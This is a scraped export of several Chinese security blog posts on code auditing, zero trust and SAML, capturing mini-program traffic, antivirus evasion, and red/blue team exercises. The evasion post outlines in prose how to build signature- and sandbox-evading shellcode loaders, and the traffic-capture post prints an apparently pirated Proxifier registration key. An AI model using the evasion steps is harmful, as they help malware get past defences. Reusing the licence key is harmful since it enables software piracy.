在循环语句中，循环体被重复执行的次数由循环条件所控制。它是一个标量表达式 若控制表达式的值不等于0，循环条件为true；反之循环条件为false。 当循环条件设置不当时，会导致死循环的产生。  防范方法  在使用整数时，要避免操作结果超出整数的取值范围 在使用指针时，要判断其是否为空 变量在定义或声明时进行初始化，养成良好的编码习惯 描述循环问题时，要注意设置恰当的循环条件  发现缺陷的方法 人工审计 人工对源代码进行走查，依据缺陷的特征进行查找和分析，从而确定是否存在缺陷。 优点： 人工审计优势体现在可以发现与业务逻辑等相关的缺陷 缺点： 对审计人员能力要求高，需具备熟悉软件业务，读懂源码，且具有丰富安全知识  工具审计 运行源码缺陷检测工具，自动发现源码中存在的缺陷  自动化检测工具通常内置多种检测规则，在接收到输入内容后，将输入内容转变为易于扫描分析的数据结构，然后使用静态分析技术对其进行分析，从而发现源码中存在符合一定模式的缺陷。\n优缺点：\n效率高，存在误报漏报问题\n 奇安信代码卫士 360代码卫士 端玛DMSCA VeraCode静态源代码扫描分析服务平台 Fortify SCA 及 Checkmarx产品扫描服务  人工审计与工具审计结合 先通过工具审计的方式获取检测结果，然后再人工对检测结果进行复审，从而发现缺陷。  缺陷处置流程 1.发现并确认缺陷  与开发流程整合  开发人员可以在管理平台中配置好任务计划，检测工具根据任务计划的设定，自动从SVN、Git等代码仓库中获取代码进行检测。检测结束后，可以查看检测结果并进行审计。   安全部门实施测试  在系统上线前，安全部门要对全部源代码进行一次安全检测和审计，对软件源代码的安全状况进行整体把控，并修复发现的安全缺陷，在代码各项指标达到最初设定的安全目标后方可上线发布。    2.修复缺陷 缺陷修复通常由开发和运维人员修复。开发人员需要根据缺陷的具体信息，制定修复方案，确认方案无误后可修改源代码，完成缺陷修复\n3.回归测试 需要对修复后的源代码进行回归测试，用于确认缺陷是否已经被修复且未引入新的缺陷。\n自动化缺陷检测技术 语法分析技术 语法分析指按照具体编程语言的语法规则处理词法，分析程序产生的结果并生成语法分析树的过程，是编译过程中的重要步骤，也是其他分析的基础。  此过程可以判断程序中是否存在语法错误(是否与BNF范式一致)\n类型分析技术 类型分析主要指类型检查，分析程序中是否存在类型错误。\n类型错误通常指违反类型约束的操作，\n控制流分析技术 控制流分析的输出是控制流图，\n通过控制流图可以得到关于程序结构的一些描述，包括条件、循环等信息。\n数据流分析技术 数据流分析用于获取有关数据如何在程序的执行路径上流程的信息。\n同时污染传播分析也是数据流分析技术的一种应用。\n代码安全保障技术趋势 随着开发模式的不断演进和信息安全趋势的变化，人们对代码安全保障技术提出了规模化、自动化、智能化的要求，以期实现软件快速、安全、自动的发布。\n基于AI的代码安全分析 人工智能技术和传统代码安全技术的结合是代码安全领域的重要发展趋势之一。  引入人工智能后，我们可以将SAST工具的结果作为输入，不断进行缺陷训练，从而发现误报，\n然后系统会输出某个置信水平内的误报列表(或排除误报的列表)。\n为了对其进行进一步的改进，可以通过结果的审计，识别出新的误报并反馈到训练集中，计算出新的模型。\n面向安全的软件代码成分分析 SCA技术和其他AST技术的深入融合也是代码安全技术发展的趋势之一。  软件代码成分分析(Software Composition Analysis,SCA)技术指通过对软件的组成(如源码、字节码、二进制文件、可执行文件等)进行分析，\n识别出软件中使用的开源和第三方组件(如 底层库、框架等)，\n进一步发现开源安全风险和第三方组件的漏洞。\n面向DevSecOps的代码安全测试 能够在代码编写的同时，发现代码中的安全隐患，从而在第一时间修复，成为DevSecOps的基本需求。因此IDE插件、轻量级的客户端快速检测模式也成为下一代代码安全产品的标配。  由于大量应用持续集成，部署在DevOps中，代码安全产品需要与Jenkins、Bamboo等持续集成系统，Bugzilla、Jira等生命周期管理系统进行集成，实现有效的自动化。\n同时，提供针对代码安全基线的检测，以及增量分析、审计信息携带等功能，可在少量或没有人工参与的情况下，尽可能快速、有效保证软件的安全性。\n交互式应用安全测试 IAST技术结合DAST技术和SAST技术，从而提高测试的准确率，同时对代码的测试覆盖率达到了与SAST相似的水平。  IAST的插桩模式原理：\n插桩探针想要分析数据流需要做两件事：\n 理解代码\n根据不同语言来区分需要关注哪些函数，这些函数里哪些是污点输入？哪些是污点传播？哪些是污点清洗？以及又有哪些是污点汇聚？这个我们可以根据不同的漏洞原理来做分析. 捕获关键关键函数的调用情况\nJava提供了一个instrumentation 接口。通过该接口，可以以一种标准的方式，在启动应用时添加javaagent参数来加载插桩探针，通过Agent获取到JAVA的目标代码（字节码）、并修改字节码的方式在程序目标码确定函数执行点，并追踪函数执行过程，分析数据流。从而实现动态数据流污点追踪。   锁定是一种同步行为，可确保访问相同资源时多个独立运行的进程和线程不会互相干扰。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","description":"","id":53,"section":"en","tags":null,"title":"软件代码缺陷概述","uri":"http://crkmythical.github.io/en/blog/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0/"},{"content":"编写进度\n   EAA 现有解决方案及其局限性  应用直接面对公网威胁 VPN部署和防火墙规则不灵活，VPN访问慢 多应用情况下的单点登陆 对访问终端安全没有控制方式，恶意软件，网络钓鱼和数据泄露  Akamai方案EAA\n  访问的安全性\n  网络的安全性\n  访问审计的安全性\n  管理的易用性\n  运营成本的支出\n  Akamai EAA方案优点\n 快速安装部署无需安装客户端 降低资本支出和运营成本 简化管理 确保应用安全    Identity Provider(IdP)\n外部身份源（Identity Provider，简称 IdP）指的是一个存储和管理用户信息的外部服务，使用外部身份服务商可以降低用户管理成本以及降低用户使用成本。\n零信任网络安全框架 https://docs.authing.cn/v2/concepts/zero-trust-network.html\n概念： 零信任是一种安全模型，基于多种信任要素（如访问主体身份、网络环境、终端状态等）对所有用户进行持续验证和动态授权。 （由弗雷斯特研究公司首席分析师JohnKindervag提出）\nAkamai 被评为 Zero Trust 领导者\n  传统的安全模型通过 一次验证+静态授权的方式评估实体风险，\n  而零信任基于 持续验证+动态授权 的模式构筑企业的安全基石。\n  零信任核心原则\n 永不信任，持续验证 构建身份安全基石  ​\t零信任对人，终端和应用进行统一身份化管理，建立以身份为中心的访问控制机制。\n​\t以动态考量因素(如访问主体身份、网络环境、终端状态等)持续检测访问过重中违规和异常行为，确保接入网络的用户和终端持续可信\n 动态授权 ， 精细访问控制，权限随需而动  ​\t零信任将访问目标的权限细化到应用级、功能级、数据级，只对访问主体开放所需的应用、功能或数据，满足最小权限原则，收缩潜在攻击面。\n​\t同时安全控制策略给予访问主体、目标客体、环境属性(终端状态、网络风险、用户行为等)进行权限动态判定，实现应用功能、数据等维度的精细划分和动态控制。\n 全局防御， 协同联动，威胁快速处置  ​\t零信任通过对终端风险、用户行为异常、流量威胁、应用鉴权行为进行多方面评估，对信任分低的应用或设备生成相应的处置策略，联动网络或安全设备进行威胁快速处置。\n零信任的技术本质是以身份为基石的动态访问控制，其主要价值为将安全能力内嵌入业务体系，构建自适应的内生安全机制。\n好处：\n场景一：异地协同办公，数据融合管理，业务云化部署\n每个用户及其所使用的访问设备进行身份验证，同时将每个用户的权限降低到处理其业务所需的绝对最小权限。\n企业部署场景\n 具有远程分支机构 多云 有大量非员工访问需求 跨企业边界的写作文 面向公众的服务企业  零信任架构（ZTA）实施建议  零信任：同步工作  优先考虑实施，关键网络最先实施 设置零信任管理岗位 数据通信全程加密   用户认证  探索和测试颗粒度更细的用户属性 身份管理者统一管理 管理职权依赖任务临时分配 开发用户许可级别 各组织之间制定共同战略 将零信任原则作为用户和设备的基线   设备认证  准入前设备检查和定期设备健康检查 记录设备使用日志 构建 \u0026ldquo;以便携为中心\u0026rdquo; 的设备管理   最小权限访问授权  使用单一联合授权源 精细的级别标记数据和资源 用户和设备位置与授权解耦    讨论 EAA与VPN的区别和优势 SAML身份验证机制 SAML（Security Assertion Markup Language）是一个基于XML的开放标准数据格式，用于在不同的安全域之间交换认证和数据授权。SAML解决的最重要的需求是Web端应用的单点登录（SSO）\nSAML协议工作流程 SAML角色：\n  SP(Service Provider) : 向用户提供服务的web 端应用\n  IdP(Identity Provider) : 向SP提供用户身份信息\n  User : 通过登录IDP获取身份断言，并向SP返回身份断言来使用SP提供服务的用户\n   用户请求访问 Web 应用系统。 Web 应用系统生成一个 SAML 身份验证请求。 Web 应用系统将重定向网址发送到用户的浏览器。重定向网址包含应向SSO 服务提交的编码 SAML 身份验证请求。 IDP 对 SAML 请求进行解码。 IDP对用户进行身份验证。认证成功后，IDP生成一个 SAML 响应，其中包含经过验证的用户的用户名。然后将SAML 响应编码并返回到用户的浏览器。 浏览器将 SAML 响应转发到 Web 应用系统 ACS URL。 Web 应用系统使用 IDP 的公钥验证 SAML 响应。如果成功验证该响应，ACS 则会将用户重定向到目标网址。 用户将重定向到目标网址并登录到 Web 应用系统。  在 SAML 协议中，IDP 和 SP 不需要直接进行通讯，只要用户浏览器可以访问到 IDP 和 SP 即可。\n也就是说 SAML 协议在混合云环境下也可以正常进行使用，只要用户浏览器可以访问到公有云的 IDP 和内网的应用就可以使用 SAML 协议集成应用的单点登录。\n参考：\n什么是零信任，为什么零信任很重要\n","description":"","id":54,"section":"en","tags":null,"title":"ZeroTrust","uri":"http://crkmythical.github.io/en/blog/zerotrust/"},{"content":"编写进度\n   Burpsuite抓取微信小程序流量 通过Proxifier工具代理微信小程序流量到Burp\n 安装Burpsuite证书到macOS系统中  安装proxifier并添加Proxifier规则   Your name or company name:\nmacwk.com\nYour registration key:\n2DNRX-V3PNK-TEGYN-DR01D-9UGGT\n 1  brew install --cask proxifier   添加代理和配置代理规则\n 微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app\n  ⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理)\n 抓包成功\n存在其他代理(如clashX)时，Proxifier设置方法\n","description":"","id":55,"section":"en","tags":null,"title":"如何在mac上抓小程序的流量","uri":"http://crkmythical.github.io/en/blog/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/"},{"content":"编写进度\n   杀毒软件常见检测方法： 通常分为静态特征查杀和动态行为检测(包括沙箱)\n  静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。\n做法：模糊哈希算法，机器学习跑模型 ，\n绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）对特征码进行混淆处理\n  动态行为检测 ，沙箱执行可以程序\n做法：hook关键api，监控注册表启动项，系统文件，防止对其修改 绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)\n  熟悉各个杀软的查杀特性   火绒： 重点基于字符串去查杀， 做法：重点针对函数如regMovememory进行字符串混淆或更换函数\n  360： 重点基于函数具体触发的行为去查杀 做法： 延时，沙箱检测，文件重命名检测\n  WinDefender： 重点基于特定位置，特征码去查杀 做法：找特征码去混淆\n  针对各个杀软的特点进行自定义加载器 免杀处理思路：\n  源码免杀，（有源码时） 定位特征码，进行混淆\na)如内嵌汇编加载、内存免杀(渐进式申请一块内存，最后改为可执行)、分离免杀、二次编译、\nb)隐藏IAT、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等\nc)shellcode进行异或 编码base64，AES加密等\n  无源码免杀，在源码不好修改时，\na)resourceHacker资源修改、\nb)vmp加壳、加签名、PE优化等组合使用\n  白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等\n  Powershell混淆绕过 \u0026ndash; 根据powershell语言特性，字符串转换，变量转换，编码，压缩等\n  偏僻语言编写shellcode\n  加载器分离免杀\n  简述远程加载器分离免杀的思路比较好，实现代码逻辑  规避网络测绘-\u0026gt;shellcode混淆-\u0026gt;beacon去特征\n大体思路：\nWinhttp库或window sockets实现http请求（cs使用winInet库） \u0026ndash;\u0026gt; 存在问题：容易暴露自己C2和文件服务器地址(域前置解决)\n对shellcode进行AES动态加密\n 服务器\n用netty框架，采用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端 客户端（C++加载器）   每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器 服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端 用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址  甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能\nshellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode\nshellcode混淆器-Obfuscator\n修改加载器特征\n加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」\n修改方法：\n对A进行 base64编码+加密（如xor）(更安全)， 对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数\n修改加载器的特征\n对func_get_delegate_type，func_get_proc_address两个函数重命名替换，对函数里面的一些变量进行重新定义\n分离免杀 shellcode加载器=S_0「shellcode_downloader」+ S_1「donwlod+run_shellcode」\n通常杀软只检测一个进程的行为，\n做法： 使用windows管道，socket通道\n分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。\n修改资源 杀软会检测文件的描述，版本号，创建日期作为特征检测\n做法： 使用restorator对目标修改资源文件\n隐藏IAT 杀软检测导入表中是否存在可疑函数\n做法： opt1 调用getProcessAddress获取所需函数地址\nopt2 用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数\nmsf与cs的stager对比分析 相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage\n不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError\npayload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载) meterpreter加载顺序：stager-\u0026gt;metsrv.dll-\u0026gt;stdapi.dll\ncs-beacon加载顺序： stgaer-\u0026gt;beacon.dll\nC2实现方式：  meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务 Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)  通信协议上差异： cs和msf均使用http/s进行数据通信，但具体传输方式上有差异 meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定） Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性  具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接.\n","description":"","id":56,"section":"en","tags":null,"title":"免杀思路","uri":"http://crkmythical.github.io/en/blog/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/"},{"content":"编写进度\n    红蓝对抗\n组织 多支攻击队伍 对 各行业重点点位目标系统 进行集中攻击，检验防守方的防护能力，通过预判的规则，以积分形式确定双方的排名。    攻击者(经授权的国家科研机构、安全公司/团队)\n  防守方(系统运营单位、其他协同防护主体)\n  裁判组(组织方、第三方权威机构)\n  得分场景\n 积极配合应急组工作，根据线索能快速准确定位受害系统，能提供充分的日志记录，配合执法机关固定证据完成勘验发现木马攻击 发现漏洞攻击，记录完整的攻击路径，并需触发响应的应急处置流程 处置Webshell木马或主机木马程序，并需触发响应的应急处置流程 处置主机异常新增账户，处置被爆破账户密码，并需触发响应的应急处置流程 处置Web系统、FTP等异常新增账户，处置被爆破账户密码消除其他威胁 发现钓鱼攻击，快速定位钓鱼样本，并提交样本分析报告 发现社会工程攻击，上报攻击者有效个人信息(职位、姓名、电话、公司)等 发现并成功溯源攻击者，上报攻击者有效信息(IP、设备信息、个人信息) 发现并成功反制攻击者，控制攻击者主机及网络环境    失分场景\n 被获取域控服务器权限 被获取路由器、交换机、防火墙等网络设备权限 被获取Web应用系统服务器、邮件服务器、数据库服务器等权限 被获取业务内网邮箱、FTP应用、Web应用系统、数据库远程访问、互联网VPN接入系统的账户密码 被获取Webshell权限 被获取终端计算机权限 被获取其他设备权限    ** 攻击队\n基本攻击思路\n 主要资产正面突破\n此路径系统漏洞相对较少，防护设备与安全措施相对更严密，攻击难度大且易被察觉，但由于资产重要程度较高，有所突破能有较大收益 边缘资产迂回突破\n此处防御相对薄弱，监控缺失，攻击难度较小，但若要进一步入侵核心层，往往还需要多次横向和纵向的扩展 第三方侧面入侵\n利用上下游公司、外包开发商等与企业的网络具有关联性的机构，攻击者可通过首先入侵第三方，再扩展到企业，从而达到侧面入侵的目的 以人为突破口\n瞄准安全意识薄弱的员工进行钓鱼等社工，可以广撒网，也可以精准打击运维等具有管理权限的员工 利用联网的硬件入侵\n通过联网的设备，利用网络互联、隔离不够等防护脆弱点，实现目标的迂回攻击  *** 初始信息收集\n攻击者搜集关于目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息，后期这些信息将为攻击决策提供支撑。\n收集信息的种类报告但不限于分支机构、关联公司、外包公司、投资公司、人员、网络、主机、域名、账户、邮箱等信息。\n可进行收集信息的公开渠道：\n| 天眼查 | 企查查 | 搜索引擎 | 社交网络 | ICP备案库 | 社工库 |\n| Fofa | Shodan | 官网 | 主/子域名 | BGP归属 | Zoomeye |\n自动化工具常用来实现对攻击目标资产的持续跟踪，并对临时增加的资产，进行蜜罐识别探测\n识别资产指纹，记录攻击目标资产的更详细类型，如CMS、第三方系统、组件、中间件等，以便对应到可进行利用的漏洞\n收集攻击目标所涉及核心人员的全面信息，包括线上、社工，钓鱼等\n通过自动化工具结合人工操作，持续进行信息搜集和扫描查点工作，长用手段:\n| 高频探测 | 口令爆破、重放攻击、爬虫扫描、信息抓取 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-|\n| 敏感文件探测 | SVN泄露、Git泄露、备份文件泄露 |\n| 敏感端口探测 | 22、3306、7001、6379、8080等 |\n| 敏感路径探测 | 网站后台、未授权页面 |\n| 信息劫持攻击 | 中间人劫持、DNS劫持 |\n*** 选择攻击方案\n对基础信息进行分析后，确认出关键任务，关键系统，边缘系统，物理地址等信息，攻击成员分工领取攻击任务，\n方案包括：物理入侵、钓鱼邮件、Wi-Fi入侵、边缘资产渗透、互联网边界突破\n*** 初始入侵\n利用搜集到的信息，自动化攻击工具、漏洞储备资源、计算资源能力，通过利用安全意识漏洞、Nday和0day进行攻击，突破到内网区域\n一般会先采用自动化工具进行第一波突破，若无果，再采用遍历攻击面的方式，逐个系统人工深入挖掘漏洞。\nWAF对抗/IPS对抗 \u0026ndash;\u0026gt; EDR绕过/补丁绕过 \u0026ndash;\u0026gt; 漏洞利用/Webshell\n 扫描器产出漏洞深入利用 利用员工账户爆破VPN系统 上传Webshell进一步获取控制权 OA系统/邮箱/VPN人工尝试登陆 尝试绕过WAF利用漏洞 人工注册业务系统账号挖掘漏洞  *** 站稳脚跟\n通过特定的工具，利用初始入侵得到的突破口，建立好进入内网的通道，同时做好隐蔽防止被发现，能稳定在内网立足\n通过虚拟机攻击云管理平台，利用管理平台控制所有机器\n通过直接从虚拟机进行逃逸，从而控制宿主机，然后利用宿主机控制其上所有虚拟机\n*** 权限提升\n通过内核提权、不安全服务等各类手段，将攻击者的权限进行一定的提升，甚至到最高权限，一边进一步操作\n*** 内部信息收集\n利用新的立足点，进行内网的信息收集，包括内网的网络结构，脆弱服务，用户账户密码等，为下一步行动做准备\n*** 横向移动\n结合之前搜集的信息，在通过特定漏洞和工具进行横向移动，扩展到新的位置。\n定向攻击核心目标，通过内网横向渗透，获取到更多的服务器控制权，更多的管理员信息，更多人的密码。\n如DevOps发布系统，Jenkins/Git/SVN代码仓库、堡垒机、跳板机、开发运维、开发环境权限\n*** 权限维持\n扩展到新位置后，利用工具稳定攻击者权限，使能够立足在内网新位置\n*** 完成目标\n通过不断的权限提升-内部信息收集-横向移动-维持权限这个循环，逐步靠近目标，最终完成目标\n** 防守队\nP2DR模型：是机遇策略的模型\n  Policy: 策略是模型的核心，所有的防护、检测和响应都是依据安全策略实施的\n  Protection: 防护是根据系统可能出现的安全问题而采取的预防措施。采用的防护技术包括数据加密、身份认证、访问控制、授权和VPN技术、防火墙、安全扫描和数据备份等\n  Detection: 当攻击者穿越防护系统时，检测功能就发挥作用，与防护系统形成互补，检测是动态响应的依据\n  Response: 系统一旦检测到入侵，响应系统就开始工作，进行事件处理。\n  重点： 预防\n尽可能全面理清攻击面、清理外网泄露的敏感信息，同时对资产进行相关的测试及加固\n  基础：检测与监测\n明晰内外部资产状态，通过各类检测、监测的安全设备实时发现攻击痕迹，快速定位，为后续响应及溯源提供信息和证据\n  狙击手段：响应\n建立完善的应急响应流程，\n快速判断及处理未成功攻击，极致运用自动化体系减少防守人员的精力消耗\n准备常见应急方案，快速联动处理突发情况，做到快速发现、定位分析、响应处置\n  得分手段：溯源\n利用技术手段还原攻击者攻击首发，定位身份\n通过攻击中暴漏的IP/域名或其他信息，结合威胁情报及相关渠道还原其画像，追溯到真人\n通过部署内外网蜜罐等手段，主动诱捕在进行信息搜集/打算入侵的攻击者\n  *** 常态化资产安全管理\n  互联网资产测绘与检测\n对互联网资产暴露面、互联网敏感信息泄露、互联网暴露的高危漏洞、端口和弱口令进行全面检测，并提供应急响应漏洞通告，帮助企业全面梳理互联网资产暴露风险\n  借助资产管理功能的安全产品\n资产安全管理平台、主机安全管理平台\n  人工盘点、跟踪、核查与确认\n梳理防火墙配置、回收老旧资产、登记新上资产\n对主要供应链进行梳理如VPN品牌、OA/邮件供应商、系统框架组件\n  效果：\n发现异常IP告警：5mins内，定位到该IP对应的资产在网络位置及物理位置，并可在技术上完成资产封堵\n新爆发0day： 5mins内排查影响，定位受影响的资产并实施封堵\n  重大保障期间：加强对互联网暴露资产进行周期性安全巡检:\n；| 检查项 | 内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;|\n| 互联网暴露面资产巡检 | 建立完整的互联网暴露面资产地图，包括外网全量自域名、外网全量端口指纹、外网Web指纹 |\n| 互联网敏感信息监控 | 定期扫描企业在Github、码云、百度文库等高风险暴露渠道的信息泄露风险 |\n| 高危端口弱口令周期扫描 | 基于企业特点定制化弱口令集，对高危端口(SSH、MySQL、RDP、MSSQL等)进行周期弱口令探测 |\n| 常见高危漏洞周期扫描 | 对常见高危漏洞进行周期扫描 |\n| 应急漏洞响应通告 | 结合企业暴露面资产指纹，获取互联网新增高危应急漏洞、云上捕获等情报 |\n 防守工作最佳实战指南  ** 全面检测\n*** 网络架构分析\n主要针对企业网络拓扑结构、安全域划分、网络访问控制规则、网络攻击路径进行调研和分析存在的网络安全问题，明确网络安全现状、为后期测试、防护加固提供方向\n| 任务 | 工作内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;|\n| 网络拓扑结构 | 通过访谈调研与工具探测，分析服务器、安全设备、网络设备、IP地址之前的关系，绘制网络拓扑 |\n| 安全域划分 | 根据企业拓扑结构及人员访谈，明确安全域的名称及作用、访问控制策略、安全管理措施 |\n| 网络访问控制规则 | 明确域间及域内访问控制关系，梳理防火墙ACL列表及NAT列表｜ |\n| 网络攻击路径分析 | 基于实战经验梳理常见网络攻击路径，梳理内、外网易受攻击资产，互联网纵向攻击、内部网络横向攻击、集权类系统风险评估 |\n| 入侵防护分析 | 根据网络拓扑及攻击面，梳理入侵防护现状、安全措施、安全设备覆盖度 |\n*** 资产梳理\n开展资产梳理工作最好从\n 调研[fn::人工进行访谈、调研、不间断判断、跟踪、核查与确认，确保防火墙配置、回收老旧资产、登记新资产等信息] 工具检索[fn:: 使用网络扫描等手段进行资产测绘]  | 任务 | 工作内容 |\n|\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 区域 | 互联网区、办公区、生产区、开发测试区、大数据区、外联区 |\n| 范围 | 业务系统、应用系统、办公系统、数据库、中间件、服务器、存储设备、网络设备、安全设备、网络拓扑结构 |\n| 纬度 | IP、域名、开放端口、服务、编号、用途、版本、型号、数据、操作系统、使用状态、账户、弱口令、通信方式、资产负责人、联系方式 |\n未知资产： 企业内未确认归属、违规对互联网开放的资产,包括：\n 公网IP地址 端口服务 Web应用 管理后台等  *** 安全意识培训\n| 层面 | 内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 政策背景 | 攻防演练活动国家、行业政策、验证体系介绍、攻防演练活动发展史 |\n| 行业事件 | 行业内发生的安全事件解读、安全事件总结与防范措施建议 |\n| 演练必要性 | 安全威胁演变趋势及影响，攻防演练行动解决的问题及收益 |\n*** 基线评估\n 内网基线评估 ：内网基线配置检查、漏洞扫描以内网基线扫描和应用及系统升级为主 外网基线评估 ：外网基线配置检查、漏洞扫描以Web安全基线，和Web漏洞为主  *** 渗透测试\n 内网渗透测试 ： 针对靶标系统、业务系统、域控、集中管控平台进行渗透测试 外网渗透测试 ： 针对所有暴露于互联网的应用和主机进行渗透测试    Web服务安全检测：\n对支持Web业务稳定运行的服务进行安全检测，包括常见系统服务、常见容器组件、业务框架、业务相关支撑系统，\n如SSH、RDP、FTP、数据库等服务，Weblogic、Tomcat、Jboss、Websphere容器、Structs2、Spring、ThinkPHP框架，\n常见的检测项如弱口令检测、安全性配置测试、系统/服务版本检测、后门检测与排查\n  Web应用安全检测：\n对被测业务功能进行安全检测，包括SQL注入、代码注入、XSS、CSRF、SSRF、XXE、越权、逻辑漏洞、文件包含、文件上传、任意文件读取、验证码安全等\n  *** 客户端检测\n通过逆向分析对APP和PC端自身安全性进行测试，包括对客户端本地存储安全、加密算法安全、加密协议安全、接口安全性等\n** 专项评估\n*** 弱口令专项评估\n| 评估方法 | 评估范围 | 评估内容 | 解决问题 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;|\n| 手动猜测、工具扫描 | 互联网区、办公区、DMZ区、针对员工OA邮箱等系统、运维人员管理口令及服务器 | 是否存在弱口令、多设备使用同一口令 | 弱口令检测以低成本方式结局最易产生严重危害的安全问题 |\n*** 敏感信息专项评估\n| 评估方法 | 评估内容 | 解决问题 